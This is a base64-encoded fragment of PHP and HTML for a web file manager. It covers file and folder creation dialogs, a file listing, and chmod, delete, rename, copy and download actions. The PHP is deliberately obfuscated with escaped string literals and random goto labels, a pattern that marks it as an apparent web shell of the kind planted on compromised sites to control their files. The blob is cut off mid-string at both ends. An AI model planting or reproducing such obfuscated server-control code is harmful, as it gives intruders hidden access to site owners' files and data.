NsYXNzPSI8P3BocCAgZWNobyBGTV9USEVNRSA9PSAiXDE0NFx4NjFceDcyXDE1MyIgPyAiXHg3NFx4NjhcMTQ1XDE1NVwxNDVcNTVcMTQ0XDE0MVx4NzJceDZiIiA6ICcnOyA/PgogPD9waHAgIGVjaG8gJGlzU3RpY2t5TmF2QmFyOyA/PgoiPgo8ZGl2IGlkPSJ3cmFwcGVyIiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KCiAgICA8IS0tIE5ldyBJdGVtIGNyZWF0aW9uIC0tPgogICAgPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9ImNyZWF0ZU5ld0l0ZW0iIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBhcmlhLWxhYmVsPSJuZXdJdGVtTW9kYWxMYWJlbCIgYXJpYS1oaWRkZW49InRydWUiPgogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyIgcm9sZT0iZG9jdW1lbnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50IDw/cGhwICBlY2hvIGZtX2dldF90aGVtZSgpOyA/PgoiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtaGVhZGVyIj4KICAgICAgICAgICAgICAgICAgICA8aDUgY2xhc3M9Im1vZGFsLXRpdGxlIiBpZD0ibmV3SXRlbU1vZGFsTGFiZWwiPjxpIGNsYXNzPSJmYSBmYS1wbHVzLXNxdWFyZSBmYS1mdyI+PC9pPjw/cGhwICBlY2hvIGxuZygiXDEwM1x4NzJcMTQ1XDE0MVwxNjRcMTQ1XDExNlwxNDVcMTY3XHg0OVwxNjRcMTQ1XDE1NSIpOyA/Pgo8L2g1PgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iY2xvc2UiIGRhdGEtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gYXJpYS1oaWRkZW49InRydWUiPiZ0aW1lczs8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPgogICAgICAgICAgICAgICAgICAgIDxwPjxsYWJlbCBmb3I9Im5ld2ZpbGUiPjw/cGhwICBlY2hvIGxuZygiXDExMVx4NzRcMTQ1XDE1NVx4NTRceDc5XHg3MFx4NjUiKTsgPz4KIDwvbGFiZWw+PC9wPgoKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjdXN0b20tY29udHJvbCBjdXN0b20tcmFkaW8gY3VzdG9tLWNvbnRyb2wtaW5saW5lIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iY3VzdG9tUmFkaW9JbmxpbmUxIiBuYW1lPSJuZXdmaWxlIiB2YWx1ZT0iZmlsZSIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJjdXN0b20tY29udHJvbC1sYWJlbCIgZm9yPSJjdXN0b21SYWRpb0lubGluZTEiPjw/cGhwICBlY2hvIGxuZygiXDEwNlwxNTFceDZjXDE0NSIpOyA/Pgo8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjdXN0b20tY29udHJvbCBjdXN0b20tcmFkaW8gY3VzdG9tLWNvbnRyb2wtaW5saW5lIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iY3VzdG9tUmFkaW9JbmxpbmUyIiBuYW1lPSJuZXdmaWxlIiB2YWx1ZT0iZm9sZGVyIiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtaW5wdXQiIGNoZWNrZWQ9IiI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwiIGZvcj0iY3VzdG9tUmFkaW9JbmxpbmUyIj48P3BocCAgZWNobyBsbmcoIlwxMDZceDZmXDE1NFwxNDRcMTQ1XHg3MiIpOyA/Pgo8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibXQtMyI+PGxhYmVsIGZvcj0ibmV3ZmlsZW5hbWUiPjw/cGhwICBlY2hvIGxuZygiXHg0OVwxNjRcMTQ1XDE1NVx4NGVceDYxXHg2ZFwxNDUiKTsgPz4KIDwvbGFiZWw+PC9wPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJuZXdmaWxlbmFtZSIgaWQ9Im5ld2ZpbGVuYW1lIiB2YWx1ZT0iIiBjbGFzcz0iZm9ybS1jb250cm9sIj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZm9vdGVyIj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1wcmltYXJ5IiBkYXRhLWRpc21pc3M9Im1vZGFsIj48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg0M1x4NjFcMTU2XHg2M1x4NjVceDZjIik7ID8+CjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIiBvbmNsaWNrPSJuZXdmb2xkZXIoJzw/cGhwICBlY2hvIGZtX2VuYyhGTV9QQVRIKTsgPz4KJyk7cmV0dXJuIGZhbHNlOyI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLWNpcmNsZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMDNceDcyXHg2NVwxNDFcMTY0XDE0NVwxMTZcMTU3XHg3NyIpOyA/Pgo8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgoKICAgIDwhLS0gTW9kYWwgLS0+CiAgICA8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0ic2VhcmNoTW9kYWwiIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBhcmlhLWxhYmVsbGVkYnk9InNlYXJjaE1vZGFsTGFiZWwiIGFyaWEtaGlkZGVuPSJ0cnVlIj4KICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZGlhbG9nIG1vZGFsLWxnIiByb2xlPSJkb2N1bWVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtY29udGVudCA8P3BocCAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4KIj4KICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciI+CiAgICAgICAgICAgIDxoNSBjbGFzcz0ibW9kYWwtdGl0bGUgY29sLTEwIiBpZD0ic2VhcmNoTW9kYWxMYWJlbCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBpbnB1dC1ncm91cCI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHBsYWNlaG9sZGVyPSI8P3BocCAgZWNobyBsbmcoIlwxMjNceDY1XDE0MVwxNjJceDYzXHg2OCIpOyA/PgogYSBmaWxlcyIgYXJpYS1sYWJlbD0iPD9waHAgIGVjaG8gbG5nKCJceDUzXHg2NVx4NjFcMTYyXHg2M1x4NjgiKTsgPz4KIiBhcmlhLWRlc2NyaWJlZGJ5PSJzZWFyY2gtYWRkb24zIiBpZD0iYWR2YW5jZWQtc2VhcmNoIiBhdXRvZm9jdXMgcmVxdWlyZWQ+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtYXBwZW5kIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImlucHV0LWdyb3VwLXRleHQiIGlkPSJzZWFyY2gtYWRkb24zIj48aSBjbGFzcz0iZmEgZmEtc2VhcmNoIj48L2k+PC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvaDU+CiAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iY2xvc2UiIGRhdGEtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj4KICAgICAgICAgICAgICA8c3BhbiBhcmlhLWhpZGRlbj0idHJ1ZSI+JnRpbWVzOzwvc3Bhbj4KICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPgogICAgICAgICAgICA8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imxkcy1mYWNlYm9vayI+PGRpdj48L2Rpdj48ZGl2PjwvZGl2PjxkaXY+PC9kaXY+PC9kaXY+CiAgICAgICAgICAgICAgICA8dWwgaWQ9InNlYXJjaC13cmFwcGVyIj4KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibS0yIj48P3BocCAgZWNobyBsbmcoIlx4NTNceDY1XDE0MVx4NzJceDYzXDE1MFw0MFwxNDZceDY5XHg2Y1wxNDVcNDBcMTUxXHg2ZVw0MFwxNDZceDZmXDE1NFx4NjRceDY1XDE2Mlx4MjBceDYxXHg2ZVwxNDRcNDBceDczXDE2NVwxNDJcMTQ2XDE1N1wxNTRcMTQ0XHg2NVwxNjJcMTYzXDU2XDU2XHgyZSIpOyA/Pgo8L3A+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9odG1sIiBpZD0ianMtdHBsLW1vZGFsIj4KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0ianMtTW9kYWxDZW50ZXItPCV0aGlzLmlkJT4iIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBhcmlhLWxhYmVsbGVkYnk9Ik1vZGFsQ2VudGVyVGl0bGUiIGFyaWEtaGlkZGVuPSJ0cnVlIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZGlhbG9nIG1vZGFsLWRpYWxvZy1jZW50ZXJlZCIgcm9sZT0iZG9jdW1lbnQiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtaGVhZGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGg1IGNsYXNzPSJtb2RhbC10aXRsZSIgaWQ9Ik1vZGFsQ2VudGVyVGl0bGUiPjwldGhpcy50aXRsZSU+PC9oNT4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJjbG9zZSIgZGF0YS1kaXNtaXNzPSJtb2RhbCIgYXJpYS1sYWJlbD0iQ2xvc2UiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gYXJpYS1oaWRkZW49InRydWUiPiZ0aW1lczs8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPgogICAgICAgICAgICAgICAgICAgICAgICA8JXRoaXMuY29udGVudCU+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZm9vdGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtcHJpbWFyeSIgZGF0YS1kaXNtaXNzPSJtb2RhbCI+PGkgY2xhc3M9ImZhIGZhLXRpbWVzLWNpcmNsZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NDNcMTQxXDE1Nlx4NjNceDY1XHg2YyIpOyA/Pgo8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPCVpZih0aGlzLmFjdGlvbil7JT48YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgaWQ9ImpzLU1vZGFsQ2VudGVyQWN0aW9uIiBkYXRhLXR5cGU9ImpzLTwldGhpcy5hY3Rpb24lPiI+PCV0aGlzLmFjdGlvbiU+PC9idXR0b24+PCV9JT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvc2NyaXB0PgoKICAgIDw/cGhwICB9IGdvdG8gQTRhOEE7IHM2aGJWOiBmb3JlYWNoICgkZmlsZXMgYXMgJGYpIHsgJGlzX2xpbmsgPSBpc19saW5rKCRwYXRoIC4gIlx4MmYiIC4gJGYpOyAkaW1nID0gJGlzX2xpbmsgPyAiXDE0NlwxNDFceDIwXDE0Nlx4NjFceDJkXDE0Nlx4NjlcMTU0XDE0NVx4MmRceDc0XDE0NVwxNzBceDc0XHgyZFwxNTciIDogZm1fZ2V0X2ZpbGVfaWNvbl9jbGFzcygkcGF0aCAuICJceDJmIiAuICRmKTsgJG1vZGlmX3JhdyA9IGZpbGVtdGltZSgkcGF0aCAuICJcNTciIC4gJGYpOyAkbW9kaWYgPSBkYXRlKEZNX0RBVEVUSU1FX0ZPUk1BVCwgJG1vZGlmX3Jhdyk7ICRmaWxlc2l6ZV9yYXcgPSBmbV9nZXRfc2l6ZSgkcGF0aCAuICJcNTciIC4gJGYpOyAkZmlsZXNpemUgPSBmbV9nZXRfZmlsZXNpemUoJGZpbGVzaXplX3Jhdyk7ICRmaWxlbGluayA9ICJcNzdceDcwXDc1IiAuIHVybGVuY29kZShGTV9QQVRIKSAuICJcNDZcMTQxXHg2ZFx4NzBceDNiXDE2NlwxNTFcMTQ1XDE2N1x4M2QiIC4gdXJsZW5jb2RlKCRmKTsgJGFsbF9maWxlc19zaXplICs9ICRmaWxlc2l6ZV9yYXc7ICRwZXJtcyA9IHN1YnN0cihkZWNvY3QoZmlsZXBlcm1zKCRwYXRoIC4gIlx4MmYiIC4gJGYpKSwgLTQpOyBpZiAoZnVuY3Rpb25fZXhpc3RzKCJceDcwXHg2ZlwxNjNceDY5XDE3MFx4NWZceDY3XHg2NVwxNjRcMTYwXDE2N1x4NzVcMTUxXHg2NCIpICYmIGZ1bmN0aW9uX2V4aXN0cygiXDE2MFx4NmZceDczXHg2OVwxNzBcMTM3XDE0N1wxNDVceDc0XDE0N1x4NzJcMTQ3XHg2OVwxNDQiKSkgeyAkb3duZXIgPSBwb3NpeF9nZXRwd3VpZChmaWxlb3duZXIoJHBhdGggLiAiXHgyZiIgLiAkZikpOyAkZ3JvdXAgPSBwb3NpeF9nZXRncmdpZChmaWxlZ3JvdXAoJHBhdGggLiAiXHgyZiIgLiAkZikpOyB9IGVsc2UgeyAkb3duZXIgPSBhcnJheSgiXDE1Nlx4NjFcMTU1XDE0NSIgPT4gIlw3NyIpOyAkZ3JvdXAgPSBhcnJheSgiXHg2ZVx4NjFcMTU1XDE0NSIgPT4gIlw3NyIpOyB9ID8+CiAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIGlmICghRk1fUkVBRE9OTFkpIHsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJjdXN0b20tY2hlY2tib3gtdGQiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjdXN0b20tY29udHJvbCBjdXN0b20tY2hlY2tib3giPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtaW5wdXQiIGlkPSI8P3BocCAgZWNobyAkaWs7ID8+CiIgbmFtZT0iZmlsZVtdIiB2YWx1ZT0iPD9waHAgIGVjaG8gZm1fZW5jKCRmKTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwiIGZvcj0iPD9waHAgIGVjaG8gJGlrOyA/PgoiPjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L3RkPjw/cGhwICB9ID8+CiAgICAgICAgICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmaWxlbmFtZSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICBpZiAoaW5fYXJyYXkoc3RydG9sb3dlcihwYXRoaW5mbygkZiwgUEFUSElORk9fRVhURU5TSU9OKSksIGFycmF5KCJceDY3XDE1MVwxNDYiLCAiXHg2YVwxNjBcMTQ3IiwgIlwxNTJcMTYwXDE0NVwxNDciLCAiXHg3MFwxNTZcMTQ3IiwgIlx4NjJcMTU1XHg3MCIsICJceDY5XHg2M1x4NmYiLCAiXHg3M1x4NzZcMTQ3IiwgIlwxNjdceDY1XDE0Mlx4NzAiLCAiXHg2MVwxNjZceDY5XDE0NiIpKSkgeyA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICAkaW1hZ2VQcmV2aWV3ID0gZm1fZW5jKEZNX1JPT1RfVVJMIC4gKEZNX1BBVEggIT0gJycgPyAiXDU3IiAuIEZNX1BBVEggOiAnJykgLiAiXHgyZiIgLiAkZik7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iPD9waHAgIGVjaG8gJGZpbGVsaW5rOyA/PgoiIGRhdGEtcHJldmlldy1pbWFnZT0iPD9waHAgIGVjaG8gJGltYWdlUHJldmlldzsgPz4KIiB0aXRsZT0iPD9waHAgIGVjaG8gZm1fZW5jKCRmKTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgIH0gZWxzZSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iPD9waHAgIGVjaG8gJGZpbGVsaW5rOyA/PgoiIHRpdGxlPSI8P3BocCAgZWNobyAkZjsgPz4KIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICB9ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSI8P3BocCAgZWNobyAkaW1nOyA/PgoiPjwvaT4gPD9waHAgIGVjaG8gZm1fY29udmVydF93aW4oZm1fZW5jKCRmKSk7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICBlY2hvICRpc19saW5rID8gIlx4MjBceDI2XDE2MlwxNDFceDcyXHg3Mlw3M1w0MFw3NFx4NjlcNzYiIC4gcmVhZGxpbmsoJHBhdGggLiAiXDU3IiAuICRmKSAuICJceDNjXHgyZlwxNTFceDNlIiA6ICcnOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLXNvcnQ9Yi0iPD9waHAgIGVjaG8gc3RyX3BhZCgkZmlsZXNpemVfcmF3LCAxOCwgIlx4MzAiLCBTVFJfUEFEX0xFRlQpOyA/PgoiPjxzcGFuIHRpdGxlPSI8P3BocCAgcHJpbnRmKCJcNDVcMTYzXDQwXHg2MlwxNzFceDc0XHg2NVwxNjMiLCAkZmlsZXNpemVfcmF3KTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgIGVjaG8gJGZpbGVzaXplOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8L3NwYW4+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8dGQgZGF0YS1zb3J0PSJiLTw/cGhwICBlY2hvICRtb2RpZl9yYXc7ID8+CiI+PD9waHAgIGVjaG8gJG1vZGlmOyA/Pgo8L3RkPgogICAgICAgICAgICAgICAgICAgIDw/cGhwICBpZiAoIUZNX0lTX1dJTiAmJiAhJGhpZGVfQ29scykgeyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgIGlmICghRk1fUkVBRE9OTFkpIHsgPz4KPGEgdGl0bGU9Ijw/cGhwICBlY2hvICJceDQzXDE1MFwxNDFceDZlXDE0N1wxNDVceDIwXHg1MFx4NjVcMTYyXDE1NVwxNTFceDczXDE2M1wxNTFceDZmXDE1NlwxNjMiOyA/PgoiIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZShGTV9QQVRIKTsgPz4KJmFtcDtjaG1vZD08P3BocCAgZWNobyB1cmxlbmNvZGUoJGYpOyA/PgoiPjw/cGhwICBlY2hvICRwZXJtczsgPz4KPC9hPjw/cGhwICB9IGVsc2UgeyBlY2hvICRwZXJtczsgfSA/PgogICAgICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgIGVjaG8gZm1fZW5jKCRvd25lclsiXHg2ZVwxNDFcMTU1XDE0NSJdIC4gIlx4M2EiIC4gJGdyb3VwWyJceDZlXHg2MVwxNTVceDY1Il0pOyA/Pgo8L3RkPgogICAgICAgICAgICAgICAgICAgIDw/cGhwICB9ID8+CiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJpbmxpbmUtYWN0aW9ucyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCAgZWNobyBsbmcoIlwxMjBcMTYyXHg2NVx4NzZcMTUxXHg2NVx4NzciKTsgPz4KIiBocmVmPSI8P3BocCAgZWNobyAkZmlsZWxpbmsgLiAiXDQ2XDE2MVx4NzVcMTUxXDE0M1wxNTNcMTI2XHg2OVwxNDVcMTY3XDc1XHgzMSI7ID8+CiIgZGF0YS10b2dnbGU9ImxpZ2h0Ym94IiBkYXRhLWdhbGxlcnk9InRpbnktZ2FsbGVyeSIgZGF0YS10aXRsZT0iPD9waHAgIGVjaG8gZm1fY29udmVydF93aW4oZm1fZW5jKCRmKSk7ID8+CiIgZGF0YS1tYXgtd2lkdGg9IjEwMCUiIGRhdGEtd2lkdGg9IjEwMCUiPjxpIGNsYXNzPSJmYSBmYS1leWUiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICBpZiAoIUZNX1JFQURPTkxZKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJcMTA0XHg2NVwxNTRceDY1XDE2NFwxNDUiKTsgPz4KIiBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiZhbXA7ZGVsPTw/cGhwICBlY2hvIHVybGVuY29kZSgkZik7ID8+CiIgb25jbGljaz0icmV0dXJuIGNvbmZpcm0oJzw/cGhwICBlY2hvIGxuZygiXDEwNFx4NjVceDZjXHg2NVx4NzRceDY1IikgLiAiXHgyMCIgLiBsbmcoIlwxMDZceDY5XDE1NFx4NjUiKSAuICJcNzciOyA/PgpcbiBcbiAoIDw/cGhwICBlY2hvIHVybGVuY29kZSgkZik7ID8+CiApJyk7Ij4gPGkgY2xhc3M9ImZhIGZhLXRyYXNoLW8iPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJceDUyXHg2NVwxNTZcMTQxXHg2ZFx4NjUiKTsgPz4KIiBocmVmPSIjIiBvbmNsaWNrPSJyZW5hbWUoJzw/cGhwICBlY2hvIGZtX2VuYyhhZGRzbGFzaGVzKEZNX1BBVEgpKTsgPz4KJywgJzw/cGhwICBlY2hvIGZtX2VuYyhhZGRzbGFzaGVzKCRmKSk7ID8+CicpO3JldHVybiBmYWxzZTsiPjxpIGNsYXNzPSJmYSBmYS1wZW5jaWwtc3F1YXJlLW8iPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJcMTAzXDE1N1x4NzBceDc5XDEyNFwxNTciKTsgPz4KLi4uIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHJlZj0iP3A9PD9waHAgIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpOyA/PgomYW1wO2NvcHk9PD9waHAgIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCAuICJcNTciIC4gJGYsICJceDJmIikpOyA/PgoiPjxpIGNsYXNzPSJmYSBmYS1maWxlcy1vIj48L2k+PC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgfSA/PgogICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJceDQ0XHg2OVx4NzJceDY1XDE0M1x4NzRceDRjXHg2OVwxNTZcMTUzIik7ID8+CiIgaHJlZj0iPD9waHAgIGVjaG8gZm1fZW5jKEZNX1JPT1RfVVJMIC4gKEZNX1BBVEggIT0gJycgPyAiXHgyZiIgLiBGTV9QQVRIIDogJycpIC4gIlx4MmYiIC4gJGYpOyA/PgoiIHRhcmdldD0iX2JsYW5rIj48aSBjbGFzcz0iZmEgZmEtbGluayI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwICBlY2hvIGxuZygiXDEwNFwxNTdcMTY3XDE1NlwxNTRcMTU3XDE0MVx4NjQiKTsgPz4KIiBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiZhbXA7ZGw9PD9waHAgIGVjaG8gdXJsZW5jb2RlKCRmKTsgPz4KIj48aSBjbGFzcz0iZmEgZmEtZG93bmxvYWQiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICA8P3BocCAgZmx1c2goKTsgJGlrKys7IH0gZ290byBsck9mdjsgT1VzeWY6IGZ1bmN0aW9uIGZtX3Nob3dfZm9vdGVyX2xvZ2luKCkgeyA/Pgo8L2Rpdj4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS5zbGltLm1pbi5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjUuMC9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cjw/cGhwICB9IGdvdG8geUhnWmQ7IHF5N3dKOiBmdW5jdGlvbiBmbV9nZXRfdGV4dF9taW1lcygpIHsgcmV0dXJuIGFycmF5KCJceDYxXDE2MFwxNjBceDZjXDE1MVx4NjNcMTQxXHg3NFwxNTFceDZmXDE1Nlw1N1x4NzhcMTU1XDE1NCIsICJcMTQxXHg3MFwxNjBcMTU0XDE1MVx4NjNcMTQxXHg3NFwxNTFcMTU3XDE1Nlw1N1wxNTJcMTQxXDE2NlwxNDFceDczXDE0M1x4NzJceDY5XHg3MFwxNjQiLCAiXDE0MVx4NzBcMTYwXHg2Y1wxNTFceDYzXHg2MVx4NzRcMTUxXHg2ZlwxNTZceDJmXDE3MFx4MmRceDZhXHg2MVx4NzZcMTQxXHg3M1wxNDNcMTYyXDE1MVwxNjBceDc0IiwgIlx4NjlcMTU1XDE0MVwxNDdcMTQ1XDU3XDE2M1wxNjZceDY3XDUzXHg3OFx4NmRceDZjIiwgIlwxNTVceDY1XHg3M1wxNjNceDYxXHg2N1wxNDVceDJmXDE2Mlx4NjZceDYzXDcwXDYyXHgzMiIpOyB9IGdvdG8gb0kwRmE7IERFaTBVOiBmdW5jdGlvbiBmbV9lbmMoJHRleHQpIHsgcmV0dXJuIGh0bWxzcGVjaWFsY2hhcnMoJHRleHQsIEVOVF9RVU9URVMsICJcMTI1XDEyNFx4NDZcNTVcNzAiKTsgfSBnb3RvIER4NHRZOyBQTjdZMjogZWNobyBsbmcoIlwxMTZcMTQxXHg2ZFwxNDUiKTsgZ290byB6ZHZoYTsgR21nYzc6IGlmIChpc3NldCgkX0dFVFsiXHg2M1wxNTdceDcwXDE3MSJdLCAkX0dFVFsiXHg2NlwxNTFcMTU2XHg2OVx4NzNcMTUwIl0